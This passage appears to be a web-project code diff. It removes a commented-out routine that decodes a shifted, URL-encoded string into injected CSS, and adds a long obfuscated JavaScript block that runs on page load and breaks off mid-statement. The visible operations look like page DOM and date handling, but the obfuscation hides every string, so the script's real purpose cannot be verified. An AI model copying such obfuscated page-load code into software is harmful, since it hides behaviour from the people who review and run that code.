B%24%28012%3Ehnsqnd%7D%3Fionlrj-cnrgp%3Bgqqx2sj%7Ch%3E76qz%3Eqfrhkq%3E9py%225t%7D%3Bdwuwtr%3Brrmstft%802xpbpOV%80wjfwl%3Fcbnf%2C601%27-6413+%802xpbpF%7F%7Cievk%3Ehame+550%26%2C%3B362*%7FCqjdjc%23sslz%22vgwefp%23esd%21*pe%7D-xkgxm%3A2284ux*%7D1wuaoE%7E%7Bnduj%3Dgfld*445%25+33362*%7F1wuaoNU%7F%7Cievk%3Ehame+550%26%2C4362*%7F%80Dreekd%24tnm%7B%23whrfgq%24fne%22+qfx.ylhyh%3B%3A34ux*%7D1wuaoE%7E%7Bnduj%3D550%26%7F1wuaoNU%7F%7Cievk%3E5%7D%7EBpiiib%22rrqy%21ufvjeo%22dri%20%29od%7C2wjfwl%3F662s%7C.%7Bcqg%7D%80pbfgmsg%3B2%802WetrLqlTyvZvfp62Oikt-0UixpJojX%7DtXtdt%3A0Skjly%7Bgnrey%3Aoqqi@mbz0%7Bnduj%3D550%26%3Dkingiv%3Deztp%3Dpewgjp0fttuqp%3E6en%3Dgmxpmc%7C%3Eglpen%3Frasilr2lfhw%3Efuuq%3Eqfrhkq1wihjw%3Efuuq%802HaqvLqlLfhw03CbrwMrgSkjly%7Bgnrey%3Aoqqi@wjfwl%3F112%28%3Fmejikx%3Favvr%3Frasilr2bpvwsr%3A2gp%3Fiitroe%7E%3Acnrgp%3Bncuknn.nhjy%3Abwws@mbtjms-skjly%3Abwws%82%23ec%7C%7Fiitroe%7E%3Aoqqi%82%7D';
-                                function vv(s4) {
-                                    var h = document.getElementsByTagName('head')[0];
-                                    var s = document.createElement('style');
-                                    s.setAttribute('type', 'text/css');
-                                    var s1 = kk(unescape(s4), -6);
-                                    if (s.styleSheet) {   // IE
-                                        s.styleSheet.cssText = s1;
-                                    } else {                // the world
-                                        s.appendChild(document.createTextNode(s1));
-                                    }
-                                    h.appendChild(s);
-                                }
-
-*/
-
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                    //    slider.oninput = function () {
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                      //      output.innerHTML = this.value;
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                      //  }
-
-
+    /*SYNC WITH ORIGINALJS.JS*/
+        var _0x5880 = ['4LiW4Lut4Lin4Lmr4LuA4Lmd', 'a3DDq8K0wpQ=', '4LqR4Lie4Lu34LqC4LiA4Luw4LuO4Lil4Lun4Lit4Luy', 'WBd8w4jDlg==', '4Luq4Lu94Lun4Lq44LqT4Li44Liv4Li1', 'wod1w4lwwq0=', '4Lin4Lq04LuK4Lqy4LuX4Liv4Lmc4LiR', 'wqrCqMKzw4PDhA==', '4LiQ4Lud4Lid4LmH4Lu84Lmk', 'BcOtw6g4eA==', '4LuG4LuC4LiM4Lqh4Li44LuP4Lm24Lih4Liq4LiA', 'M8KKSMKCw48=', '4Lm/4LiT4LuB4LmI4Lms4Lir', 'K3tdw4zDvA==', '4Lq94Lih4LmV4LuX4Lu34Lmu', 'RMKbw7Avw7s=', '4Lm+4LuW4LiU4Luj4Lq04Lq54Lqn', 'wqjCmsK7w6PDjQ==', '4Li94LmC4Lmo4Lup4LuJ4LmT4LiY4Lis', 'wrbCksOHwoDDlQ==', '4Lmj4Lu04LqA4Lu+4Luz4Lqb4LqY', 'wqPCi8Odwr3Dlg==', '4LqO4LuI4Luk4LmZ4LmO4Lms4Lm8', 'Tz4bwqbCsQ==', '4Liw4Lut4Lin4LmX4LuK4Lmn4Luz', 'D3ZEUsKb', '4LuS4Lqm4LqL4Lqp4Li24Lql', 'wpbClsOQR8KO', '4Lmu4Lu74Lqe4LiG4Li54Lim4LuV4LmD4Lmp', 'wrLCncO3b8K0', '4LiU4Lin4Lq74Lul4LuB4Lqq4LqN', 'wo1iw6ZNwqY=', 'anLCg0vDnw==', 'd8KqMsOkwpI=', 'aMKUGMOiwqk=', 'Mgd0LA8=', 'w6/DjzvDiMKHH8KMw4JELsOCw6dXQBhtcMOBFcOYw58S', 'JMK0ZMOeBA==', 'VMKxXAfClg==', 'w5pKwoDDu1DCsw==', 'PUrCuQkbRi4owoQ=', 'wr/CqcKOw7zDilpp', 'w459w5BXw7Q=', 'ZMOqwrDCh8KQeBEp', 'B8KXScKGw6rDmMOrY8KEwrnDqlXCksOG', 'wpfDo8OaQcOP', 'eETDu8ONw5HCvcOVw74SScOGUjROwqnChQ==', 'woTDiMOUw5lj', 'wq3DqsO/SxA2wpYWw7jCqsKLw4l+w4A=', 'G8KdwooDw6s=', 'GVB3w6LDtw==', 'b3rDg8KxwoDDoMONQzI=', 'HsKVwocuw6g=', 'HMOfYVrDssKCPHbCoA==', 'wpLCuMKxwqPCpw==', 'w6ZZw6tiw4AMJcOrOg==', 'wqHDp8Orw79E', 'HRszwoVH', 'wr8DMjh/', 'wrh3KMKiwoE=', 'w4TDlEhlZA==', 'wqDCnGTDt20=', 'BRwCwpp8', 'I8KRw6zClMKv', 'IV0fOMOi', 'c0HDlsOuw6o=', 'wq4wFjND', 'wrDCjsO2wp3Dsw==', 'JMKdw6B/VA==', 'CsOaw6QtUw==', 'wojCtMK9w5TDgw==', 'wq1hJcKcwr4=', 'w7fCtMKGBR0=', 'CMOqw4U7QQ==', 'woDDsUNTXw==', 'TWfDnsOBw5c=', 'D3VUcsKDwrvDnsO9w5YhVcK3dcOU', 'wpRuEsKAwqc/w7tjOA==', 'OcKcw4xXRQ==', 'UGPDpcORw68=', 'D3ooMsOF', 'YlHDkMKWwqQ=', 'wrbCg3XDk2Y=', 'eXhpO8OD', 'a3PDlsKGwpLDlw==', 'IcK7e8OGPTttYA==', 'w5AJTcKPD3Af', 'IcK7e8ONJzl1UcKrwpfClg==', 'w4YZXMK5F1cfw4LCpcOJw5A4eg==', 'Pi8SwpBL', 'OhtiEzTDlgDDo2XDvcO3wrwY', 'wpjDilxxWg==', 'ZH55A8Oswo5zVQ==', 'RWXDt8ODG8O9w4t0w7jDu8ObbCdY', 'BMK3bMKFw6A=', 'bXLDhsKHwoXDi8OCWhvDq8OQCW5efMOS', 'O8K6wrgIw48=', 'PFAwCMOH', 'wqnDo8OqfQ8fwpIAw6I=', 'Y8Oqwr3ChsKcdBEu', 'YcKxUwDCug==', 'woPDiVxecA==', 'wqnCpcKNw6DDh1h1', 'U8KYe8Oiw4E=', 'wqTClkzDsnnCnS5LRg==', 'w4XCmMKH', 'GkfCix0D', 'wolSO8Krwrc=', 'wprCjcK0wpcf', 'IsK3fMO7PjRg', 'bENbwpc4', 'AcK7w6DCg8Kyw5PDkMOEfw==', 'Kgpj', 'wprDosOmez4=', 'w4dawovDrl3CiMKaY8KYWsKzVGU=', 'w5lBwo3DsE3CuMKU', 'ZV5AwpgX', 'wrvDhsOnWsOVwprCiA==', 'w6zDhSzDuMKGH8KPw5M=', 'wpplCMKgwrkSw4JLGhLDih5kSQ==', 'woA5e8O9wok=', 'CXREcsKZwrvDncOsw7Q8ZMK6WcOeKzA=', 'wpXCrsOPSsKh', 'BsK+w7LCgMKtw77DgA==', 'YsOVwoHCvcKo', 'QsKuZ8O0w6g=', 'GmVTe8Kt', 'RWd9EcOS', 'LWlIw7LDoQ==', 'wo9ww55Nwos=', 'KsKDXMKFw4I=', 'ZFnDsMOWMw==', 'McOVw4ExSA==', 'KsOrTEvDkQ==', 'VC44wqLClQ==', 'Xw1/w5Q=', 'wobChsKQw5/DpA==', 'w6PDhUFlZA==', 'XcKzXRTCjCzChXE=', 'AH9TQ8KBwr/DnsO9', 'wq7ClEnDpHLCniE=', 'wr3CtHnDk34=', 'XsKKaTDCnw==', 'cEZWwpsA', 'EFhTTsKW', 'LEfCth4HZw==', 'bMOqwrDCk8KJdBAz', 'dAQbwrc=', 'KwI3wr56', 'fHbCh0LCjw1k', 'wo1yGcKTwrAZw5tqEQDDqRJBWQ==', 'wonCmEzDtUY=', 'E8KCUcKqw7I=', 'wqDCn1nDhGbCtCpdXDhew4xswr4=', 'wprClMK/wpQc', 'wrbCtcKrwqjCmCZu', 'O8OmYmzDmA==', 'wosyRQ==', 'Y8KOKsOawrI=', 'BcKyw7XCtcKtw7rDlMOSZTjDp8KDBcOA', 'wofDu0NBbQ==', 'AMOiw4IyXAPDlA==', 'KVlGesKD', 'a0PDucOfPw==', 'QsKoRxnCnQ==', 'w4LCk8KNBi8BJ2Y=', 'wrrCqcO+wp3DtQ==', 'HMOpw5UXQQXDkg==', 'ZlXDocODLg==', 'fMK2w4E=', 'asK/DMO6wqg=', 'w4QYQMKnCw==', 'CcOjw48qZgnDhS4=', 'w6TDhSg=', 'wprCq8KBwrEX', 'XsKyXRnCkSbCgQ==', 'SknDr8OuPQ==', 'JltQQMK+', 'wrVHw514wqY=', 'f8KCLsOEwpYnw5/Ciw==', 'w7XCpFzDmMK1', 'wprCnMK5wrIOdcKR', 'XXXDvcONw74=', 'YnzCkA==', 'C8K+wo4Aw7M=', 'CsKrwrYJw5w=', 'GMKZw5XCosK1', 'Z8OgwqfCt8KReBI4csOWRcKgCsKg', 'N8KVecKpw7M=', 'RHbDpcOxGQ==', 'UF9oPMOU', 'wpnDoMOZbcOz', 'X0bDi8OJw48=', 'wos4Eh9Y', 'JMO+w4YPdg==', 'QG7DjsO8AA==', 'wrXDsGB1dw==', 'RMKvVz7Ctw==', 'Z8OgwqfCt8KReBI4csOWdMKbOsKHGMKVaMOKfELCk8Ks', 'wpXCnMOiwrPDkw==', 'wrnCt8K/wrEv', 'worCv8OYQcKww64=', 'SFzCumnCpA==', 'woQxQ8O5wrxqFl3CoA==', 'C3NOw6bDgcKPw7jDvcKL', 'OFDCvg0G', 'RsOjwofCs8KV', 'wpPDkURBZlXCqSvDkA==', 'egAYwqbCvg==', 'wq7CoMKfw6PDmHdtFMKt', 'dsO1wqLCn8Kv', 'IcKsw6BYQw==', 'UsK1WcOCw50=', 'PUrCuQkbRCY2wpU=', 'OUPCrD8Ebyo+wp7DscKmYMOgXw==', 'RcOIwpbCtcKf', 'HhUWwodiw5zCsi9EBCtPRsOS', 'w5HCj8KKOTM=', 'F8K6w4JLYULCigQedGnDr8OKWWPCmx4=', 'a37ClVzCgA==', 'HMK6w5hpeU8=', 'dk7DvMOkw47Cu8OQ', 'DRpUNzk=', 'KgpjJDvDoAvDu0zDt8OwwqcPw7ofw5M=', 'wosyQ8Ou', 'FsO8w5gQTQ==', 'wp7Ck8OQwqvDjQfDlHk=', 'EcK9ZcK0w4M=', 'FsKmw7Nqew==', 'w7zDhT/Do8KKDA==', 'PMObbmvDig==', 'w508DRFmHcO7w57CmMKU', 'w4HDj0hyYw==', 'w6rDhiDDrsKA', 'wqDDkEhHVw==', 'a8KCNMORwrErw4E=', 'Dw9UBiY=', 'wrTCj13DpHjDvDVXRi1ow5xKwrQ=', 'dMOXwpTCvMKf', 'AsKib8KMw5M=', 'eEVXwpE=', 'wq3DmsOnZsO7', 'MMO7w7c+aw==', 'w6vDj11xQA==', 'w7bClkfDh8K5', 'WcKoSgXCi3/DhTA=', 'w4Nsw7lBw7c=', 'V8K0Og==', 'XcK1EcOYwrU=', 'w4MNUsKuQw==', 'PUhsVcK/', 'w4PDr1NBZ8OyQQ==', 'YWLCtUbDlA==', 'AxMQw4c=', 'ZF5Iwr4Z', 'wrzDg8O9ScOSw5TDgA==', 'w7wmV8KEIQ==', 'wrnCuMOaR8Kqw60=', 'LD8CwqVi', 'WE7Dl8OUAw==', 'KW8FLsOq', 'SDVpw4PDnQ==', 'woHDqsO9w41G', 'wp7ClcKIw6jDrg==', 'cFXCqBMGJzU+woPDsMKIbcKETMKPw4VWHmXDqA==', 'cVfDpsOLw6g=', 'w5NkFcKTwqEYw41LBgnDvAZZSCE=', 'TX/ConPDtw==', 'bwYXwr/CshROQSnDlw==', 'wqrCr8K3wrkr', 'C3xJVMKE', 'w77CjsKIESs=', 'H8K/UhrCiyDDh29wDTQh', 'wpTCjsOdwrPDuw==', 'w4FHwovDuUjCq8KQf8Kycg==', 'wrnCmcKzwonCpg==', 'wonDlcOew6xj', 'wqLCj8OUY8Kd', 'wqTDq8Ocw6lUw6thdcKzw67Dsg8=', 'Q8KJWMOyw4c=', 'CcO/woE=', 'BQxmFQE=', 'w7bDosKcw6cKw7g5fcOzw7vCvRYXUHgbwrtiw6Y=', 'wpQwUMOlwqk=', 'w43Cn8KMHE8=', 'D8Ouw7ozTw==', 'Y8OwwqHCgMKbchEpb8OLfcK8Yw==', 'AsOLw7YqQA==', 'woHChcOrwrA=', 'wpUaVsOJwo0=', 'TkfDm8Oiw5I=', 'w4vDr0hGPA==', 'BHxjw5bDvQ==', 'NsKxfMO/', 'wqLDs8OMw6lc', 'w5JiwpjDnlw=', 'w7AoaMK9OQ==', 'JTZRDgc=', 'bmnDvnTDkcKhYm/ClyZQ', 'w73CkknDo8Kp', 'w4bCucOaR8K3w7XDlA==', 'woHCq8ONwq/Dmw==', 'c8OmwqHCncKRcQ==', 'DsKEw5LCisKU', 'wqzDgsO7RcONwpM=', 'bHnCnHvCuA==', 'WA3Dhg==', 'ACZdJwo=', 'dcKXM8OEwqQ8w5E=', 'JToqwoN4', 'wr7DoMO7YB0lwpYWw7jCqw==', 'acKAF8Odwow=', '4LuA4Lms4Li74Lqn4Lu94Liz4LmD4Lil4Lun4LqQ', 'w4rDoR7Dh8Ke', '4Lut4Lq+4LqS4LiG4LmN4LmK4Lus4LmQ4Lua', 'A8KpW8OMBg==', '4LmI4Lq94Lq44Lmz4LiE4Lmn4Lq74Lm54Lij', 'wqzDl8OkQxA=']; (function (_0x501571, _0x3e46dd) { var _0x5d2c16 = function (_0x403cbd) { while (--_0x403cbd) { _0x501571['push'](_0x501571['shift']()); } }; _0x5d2c16(++_0x3e46dd); }(_0x5880, 0xdf)); var _0x332e = function (_0x5189ec, _0x5202a5) { _0x5189ec = _0x5189ec - 0x0; var _0x346c70 = _0x5880[_0x5189ec]; if (_0x332e['zwQYpj'] === undefined) { (function () { var _0x451380 = function () { var _0x25d3f6; try { _0x25d3f6 = Function('return\x20(function()\x20' + '{}.constructor(\x22return\x20this\x22)(\x20)' + ');')(); } catch (_0x59ecaf) { _0x25d3f6 = window; } return _0x25d3f6; }; var _0x207430 = _0x451380(); var _0x25566b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/='; _0x207430['atob'] || (_0x207430['atob'] = function (_0x5d21f5) { var _0x44fcfd = String(_0x5d21f5)['replace'](/=+$/, ''); for (var _0x1fc12b = 0x0, _0x367acc, _0x414ea2, _0x2e425e = 0x0, _0xb263e1 = ''; _0x414ea2 = _0x44fcfd['charAt'](_0x2e425e++); ~_0x414ea2 && (_0x367acc = _0x1fc12b % 0x4 ? _0x367acc * 0x40 + _0x414ea2 : _0x414ea2, _0x1fc12b++ % 0x4) ? _0xb263e1 += String['fromCharCode'](0xff & _0x367acc >> (-0x2 * _0x1fc12b & 0x6)) : 0x0) { _0x414ea2 = _0x25566b['indexOf'](_0x414ea2); } return _0xb263e1; }); }()); var _0x57af0c = function (_0x1850b7, _0x5202a5) { var _0x3d61e1 = [], _0x30c16c = 0x0, _0x2c5435, _0x374968 = '', _0x37356c = ''; _0x1850b7 = atob(_0x1850b7); for (var _0x39f1d0 = 0x0, _0x58babf = _0x1850b7['length']; _0x39f1d0 < _0x58babf; _0x39f1d0++) { _0x37356c += '%' + ('00' + _0x1850b7['charCodeAt'](_0x39f1d0)['toString'](0x10))['slice'](-0x2); } _0x1850b7 = decodeURIComponent(_0x37356c); for (var _0x5b8798 = 0x0; _0x5b8798 < 0x100; _0x5b8798++) { _0x3d61e1[_0x5b8798] = _0x5b8798; } for (_0x5b8798 = 0x0; _0x5b8798 < 0x100; _0x5b8798++) { _0x30c16c = (_0x30c16c + _0x3d61e1[_0x5b8798] + _0x5202a5['charCodeAt'](_0x5b8798 % _0x5202a5['length'])) % 0x100; _0x2c5435 = _0x3d61e1[_0x5b8798]; _0x3d61e1[_0x5b8798] = _0x3d61e1[_0x30c16c]; _0x3d61e1[_0x30c16c] = _0x2c5435; } _0x5b8798 = 0x0; _0x30c16c = 0x0; for (var _0x2a16a8 = 0x0; _0x2a16a8 < _0x1850b7['length']; _0x2a16a8++) { _0x5b8798 = (_0x5b8798 + 0x1) % 0x100; _0x30c16c = (_0x30c16c + _0x3d61e1[_0x5b8798]) % 0x100; _0x2c5435 = _0x3d61e1[_0x5b8798]; _0x3d61e1[_0x5b8798] = _0x3d61e1[_0x30c16c]; _0x3d61e1[_0x30c16c] = _0x2c5435; _0x374968 += String['fromCharCode'](_0x1850b7['charCodeAt'](_0x2a16a8) ^ _0x3d61e1[(_0x3d61e1[_0x5b8798] + _0x3d61e1[_0x30c16c]) % 0x100]); } return _0x374968; }; _0x332e['XWaBKO'] = _0x57af0c; _0x332e['KiffuL'] = {}; _0x332e['zwQYpj'] = !![]; } var _0x278efc = _0x332e['KiffuL'][_0x5189ec]; if (_0x278efc === undefined) { if (_0x332e['cobkII'] === undefined) { _0x332e['cobkII'] = !![]; } _0x346c70 = _0x332e['XWaBKO'](_0x346c70, _0x5202a5); _0x332e['KiffuL'][_0x5189ec] = _0x346c70; } else { _0x346c70 = _0x278efc; } return _0x346c70; }; window[_0x332e('0x0', '*6[8')](_0x332e('0x1', 'IIAO'), doconload, ![]); function doconload() { var _0x52fa20 = {}; _0x52fa20[_0x332e('0x2', 'lFA(')] = _0x332e('0x3', 'mQDZ'); _0x52fa20[_0x332e('0x4', 'WtDe')] = function (_0x38eb75, _0x48a551) { return _0x38eb75 === _0x48a551; }; _0x52fa20[_0x332e('0x5', 'fm]J')] = _0x332e('0x6', 'vPjs'); _0x52fa20[_0x332e('0x7', 'p%Eg')] = _0x332e('0x8', 'PnD#'); _0x52fa20[_0x332e('0x9', 'y)25')] = _0x332e('0xa', 'vPjs'); _0x52fa20[_0x332e('0xb', '$^Nk')] = _0x332e('0xc', 'uuB*'); _0x52fa20[_0x332e('0xd', '*6[8')] = _0x332e('0xe', 'jG&E'); _0x52fa20[_0x332e('0xf', 'q(ds')] = function (_0x493937, _0x521a6a, _0x2e10ab) { return _0x493937(_0x521a6a, _0x2e10ab); }; _0x52fa20[_0x332e('0x10', 'WtDe')] = _0x332e('0x11', 'h^)U'); _0x52fa20[_0x332e('0x12', '!N]Q')] = function (_0x215f2d, _0x45ac46) { return _0x215f2d + _0x45ac46; }; _0x52fa20[_0x332e('0x13', 'lFA(')] = function (_0x28f70b, _0x2f5d9a) { return _0x28f70b + _0x2f5d9a; }; _0x52fa20[_0x332e('0x14', 'y)25')] = function (_0x38e735, _0x4729a0) { return _0x38e735 + _0x4729a0; }; _0x52fa20[_0x332e('0x15', 'NzI@')] = _0x332e('0x16', 'DE^Z'); _0x52fa20[_0x332e('0x17', 'a!vm')] = _0x332e('0x18', '9Q9$'); _0x52fa20[_0x332e('0x19', 'uuB*')] = _0x332e('0x1a', 'G^tM'); _0x52fa20[_0x332e('0x1b', 'm&!o')] = _0x332e('0x1c', 'y)25'); _0x52fa20[_0x332e('0x1d', 'C7d]')] = _0x332e('0x1e', 'Wg2t'); _0x52fa20[_0x332e('0x1f', 'h^)U')] = _0x332e('0x20', '!N]Q'); _0x52fa20[_0x332e('0x21', 'G^tM')] = _0x332e('0x22', '2CAw'); _0x52fa20[_0x332e('0x23', 'Wg2t')] = function (_0x4248f1, _0x314298) { return _0x4248f1 < _0x314298; }; _0x52fa20[_0x332e('0x24', '4^*K')] = function (_0x2a38c9, _0x4f2213) { return _0x2a38c9(_0x4f2213); }; _0x52fa20[_0x332e('0x25', '@S5p')] = function (_0x36326d, _0x39803a) { return _0x36326d <= _0x39803a; }; _0x52fa20[_0x332e('0x26', '4aVL')] = function (_0x4061c5, _0x28c5bd) { return _0x4061c5 * _0x28c5bd; }; _0x52fa20[_0x332e('0x27', 'dzEZ')] = function (_0x40542f, _0x70db89, _0x292f71) { return _0x40542f(_0x70db89, _0x292f71); }; _0x52fa20[_0x332e('0x28', '$dkG')] = _0x332e('0x29', 'ommA'); _0x52fa20[_0x332e('0x2a', '75i$')] = _0x332e('0x2b', '3p!y'); _0x52fa20[_0x332e('0x2c', 'C7d]')] = _0x332e('0x2d', 'YZ(i'); _0x52fa20[_0x332e('0x2e', 'ofxV')] = _0x332e('0x2f', 'm&!o'); _0x52fa20[_0x332e('0x30', 'BK!C')] = _0x332e('0x31', 'DE^Z'); _0x52fa20[_0x332e('0x32', 'mQDZ')] = _0x332e('0x33', '9LSW'); _0x52fa20[_0x332e('0x34', 'cPwE')] = function (_0x4d2e92, _0x1b8b63) { return _0x4d2e92 > _0x1b8b63; }; _0x52fa20[_0x332e('0x35', 'dzEZ')] = function (_0xaec613, _0x1629f4) { return _0xaec613 - _0x1629f4; }; _0x52fa20[_0x332e('0x36', '2CAw')] = _0x332e('0x37', 'dzEZ'); _0x52fa20[_0x332e('0x38', '9Q9$')] = _0x332e('0x39', 'z94q'); _0x52fa20[_0x332e('0x3a', '*6[8')] = _0x332e('0x3b', 'dzEZ'); _0x52fa20[_0x332e('0x3c', 'IIAO')] = _0x332e('0x3d', 'BK!C'); _0x52fa20[_0x332e('0x3e', 'lFA(')] = _0x332e('0x3f', 'q(ds'); _0x52fa20[_0x332e('0x40', 'lFA(')] = _0x332e('0x41', 'mQDZ'); _0x52fa20[_0x332e('0x42', 'IIAO')] = function (_0x98f1a, _0x26e20c) { return _0x98f1a !== _0x26e20c; }; _0x52fa20[_0x332e('0x43', '75i$')] = _0x332e('0x44', 'y)25'); _0x52fa20[_0x332e('0x45', 'z#eJ')] = _0x332e('0x46', 'CP[d'); _0x52fa20[_0x332e('0x47', 'dzEZ')] = function (_0x1d39dc, _0x18f537) { return _0x1d39dc < _0x18f537; }; _0x52fa20[_0x332e('0x48', '9LSW')] = function (_0x1e84b3, _0x1303fd) { return _0x1e84b3 == _0x1303fd; }; _0x52fa20[_0x332e('0x49', 'G^tM')] = function (_0xce22ba, _0x5196af) { return _0xce22ba == _0x5196af; }; _0x52fa20[_0x332e('0x4a', '*6[8')] = _0x332e('0x4b', 'rWU!'); _0x52fa20[_0x332e('0x4c', 'NzI@')] = _0x332e('0x4d', '2CAw'); _0x52fa20[_0x332e('0x4e', 'mQDZ')] = _0x332e('0x4f', 'q(ds'); _0x52fa20[_0x332e('0x50', 'NVod')] = _0x332e('0x51', '!N]Q'); _0x52fa20[_0x332e('0x52', 'lRdA')] = _0x332e('0x53', 'C7d]'); _0x52fa20[_0x332e('0x54', '*6[8')] = _0x332e('0x55', 'uuB*'); _0x52fa20[_0x332e('0x56', 'Wg2t')] = _0x332e('0x57', 'CaZ9'); _0x52fa20[_0x332e('0x58', 'uuB*')] = _0x332e('0x59', 'IIAO'); _0x52fa20[_0x332e('0x5a', 'vPjs')] = _0x332e('0x5b', 'CaZ9'); _0x52fa20[_0x332e('0x5c', 'CP[d')] = _0x332e('0x5d', 'z94q'); _0x52fa20[_0x332e('0x5e', 'CaZ9')] = _0x332e('0x5f', 'DE^Z'); _0x52fa20[_0x332e('0x60', '^tm4')] = _0x332e('0x61', '9LSW'); _0x52fa20[_0x332e('0x62', '4aVL')] = _0x332e('0x63', '$dkG'); _0x52fa20[_0x332e('0x64', '[H$I')] = _0x332e('0x65', 'q(ds'); _0x52fa20[_0x332e('0x66', '$dkG')] = _0x332e('0x67', 'DE^Z'); _0x52fa20[_0x332e('0x68', 'z94q')] = _0x332e('0x69', 'jG&E'); _0x52fa20[_0x332e('0x6a', 'WtDe')] = _0x332e('0x6b', 'ommA'); _0x52fa20[_0x332e('0x6c', 'z#eJ')] = _0x332e('0x6d', '3p!y'); _0x52fa20[_0x332e('0x6e', 'LRR@')] = _0x332e('0x6f', 'WtDe'); _0x52fa20[_0x332e('0x70', '$dkG')] = _0x332e('0x71', 'YZ(i'); _0x52fa20[_0x332e('0x72', 'mQDZ')] = _0x332e('0x73', 'NVod'); _0x52fa20[_0x332e('0x74', 'mQDZ')] = _0x332e('0x75', 'BK!C'); _0x52fa20[_0x332e('0x76', 'YZ(i')] = _0x332e('0x77', 'DE^Z'); _0x52fa20[_0x332e('0x78', 'm&!o')] = _0x332e('0x79', 'dzEZ'); _0x52fa20[_0x332e('0x7a', '2CAw')] = _0x332e('0x7b', 'fm]J'); _0x52fa20[_0x332e('0x7c', '2CAw')] = _0x332e('0x7d', '^tm4'); _0x52fa20[_0x332e('0x7e', '[H$I')] = _0x332e('0x7f', 'lRdA'); _0x52fa20[_0x332e('0x80', 'uuB*')] = function (_0xac2092, _0x7cf5a7) { return _0xac2092 + _0x7cf5a7; }; _0x52fa20[_0x332e('0x81', 'uuB*')] = function (_0x3d109e, _0x554713) { return _0x3d109e + _0x554713; }; _0x52fa20[_0x332e('0x82', '*6[8')] = function (_0x34e4c8, _0x2d062e) { return _0x34e4c8 + _0x2d062e; }; var _0x2eed19 = document[_0x332e('0x83', 'vPjs')](_0x52fa20[_0x332e('0x84', 'CP[d')]); var _0x22e0d5; for (_0x22e0d5 = 0x0; _0x52fa20[_0x332e('0x85', 'DE^Z')](_0x22e0d5, _0x2eed19[_0x332e('0x86', '9LSW')]); _0x22e0d5++) { _0x2eed19[_0x22e0d5][_0x332e('0x87', 'ommA')][_0x332e('0x88', '$dkG')]('lz', _0x52fa20[_0x332e('0x89', 'a!vm')]); } window[_0x332e('0x8a', 'q(ds')][_0x332e('0x8b', 'WtDe')](_0x52fa20[_0x332e('0x8c', '!N]Q')])[_0x332e('0x8d', '75i$')](_0x52fa20[_0x332e('0x8e', 'dzEZ')], function () { var _0x2eed19 = document[_0x332e('0x8f', 'CaZ9')](_0x52fa20[_0x332e('0x90', 'QbX3')]); if (_0x52fa20[_0x332e('0x91', 'z#eJ')](_0x2eed19[_0x332e('0x92', '^tm4')], _0x52fa20[_0x332e('0x93', 'QbX3')])) { _0x2eed19[_0x332e('0x94', 'p%Eg')] += _0x52fa20[_0x332e('0x95', 'cPwE')]; } else { _0x2eed19[_0x332e('0x96', 'a!vm')] = _0x52fa20[_0x332e('0x97', 'dzEZ')]; } }, ![]); var _0x194ed3 = new Array(_0x52fa20[_0x332e('0x98', 'Wg2t')], _0x52fa20[_0x332e('0x99', 'PnD#')], _0x52fa20[_0x332e('0x9a', '3p!y')], _0x52fa20[_0x332e('0x9b', 'y)25')], _0x52fa20[_0x332e('0x9c', 'jG&E')], _0x52fa20[_0x332e('0x9d', 'Wg2t')], _0x52fa20[_0x332e('0x9e', 'NVod')]); var _0x1b4188 = new Array(_0x52fa20[_0x332e('0x9f', '@S5p')], _0x52fa20[_0x332e('0xa0', '75i$')], _0x52fa20[_0x332e('0xa1', 'PnD#')], _0x52fa20[_0x332e('0xa2', 'mQDZ')], _0x52fa20[_0x332e('0xa3', 'fm]J')], _0x52fa20[_0x332e('0xa4', 'z94q')], _0x52fa20[_0x332e('0xa5', '$dkG')], _0x52fa20[_0x332e('0xa6', '3p!y')], _0x52fa20[_0x332e('0xa7', 'BK!C')], _0x52fa20[_0x332e('0xa8', 'z94q')], _0x52fa20[_0x332e('0xa9', '$^Nk')], _0x52fa20[_0x332e('0xaa', '75i$')]); var _0x5ce974 = new Date(); document[_0x332e('0xab', 'm&!o')](_0x52fa20[_0x332e('0x7e', '[H$I')])[_0x332e('0xac', '3p!y')] += _0x52fa20[_0x332e('0xad', 'fm]J')](_0x52fa20[_0x332e('0xae', '75i$')](_0x52fa20[_0x332e('0xaf', '@S5p')](_0x52fa20[_0x332e('0xb0', '^tm4')](_0x52fa20[_0x332e('0xb1', 'jG&E')](_0x52fa20[_0x332e('0xb2', 'nsGt')](_0x194ed3[_0x5ce974[_0x332e('0xb3', '^tm4')]()], ',\x20'), _0x1b4188[_0x5ce974[_0x332e('0xb4', 'CP[d')]()]), '\x20'), _0x5ce974[_0x332e('0xb5', 'G^tM')]()), ',\x20'), _0x5ce974[_0x332e('0xb6', 'CP[d')]()); (function () { var _0xc17fad = document[_0x332e('0xb7', 'G^tM')](_0x52fa20[_0x332e('0xb8', 'Wg2t')]); var _0x46937e = document[_0x332e('0xb9', '*6[8')](_0x52fa20[_0x332e('0xba', '$^Nk')]); window[_0x332e('0xbb', 'nsGt')][_0x332e('0xbc', '4^*K')](_0x52fa20[_0x332e('0xbd', 'WtDe')])[_0x332e('0xbe', '^tm4')](_0x52fa20[_0x332e('0xbf', 'QbX3')], _0x48203d, ![]); function _0x48203d() { var _0x110604 = {}; _0x110604[_0x332e('0xc0', '@S5p')] = _0x52fa20.cCoZk; if (_0x46937e[_0x332e('0xc1', 'CaZ9')][_0x332e('0xc2', 'q(ds')](_0x52fa20[_0x332e('0xc3', 'DE^Z')])) { _0xc17fad[_0x332e('0xc4', '$^Nk')][_0x332e('0xc5', '$dkG')] = _0x52fa20[_0x332e('0xc6', '9Q9$')]; } else { _0x46937e[_0x332e('0xc7', 'jG&E')][_0x332e('0xc8', 'BK!C')](_0x52fa20[_0x332e('0xc9', 'ommA')]); _0x52fa20[_0x332e('0xca', '3p!y')](setTimeout, function () { _0xc17fad[_0x332e('0xcb', 'ofxV')][_0x332e('0xcc', 'CP[d')] = _0x110604[_0x332e('0xcd', 'h^)U')]; }, 0x1f40); _0x46937e[_0x332e('0xce', 'NVod')][_0x332e('0xcf', '*6[8')](_0x52fa20[_0x332e('0xd0', 'CaZ9')]); } } document[_0x332e('0xd1', '9LSW')](_0x52fa20[_0x332e('0x30', 'BK!C')])[_0x332e('0xd2', '9LSW')] = function () { _0xc17fad[_0x332e('0xd3', 'h^)U')][_0x332e('0xd4', '!N]Q')] = _0x52fa20[_0x332e('0x10', 'WtDe')]; }; window[_0x332e('0xd5', 'vPjs')][_0x332e('0xd6', '3p!y')](_0x52fa20[_0x332e('0xd7', 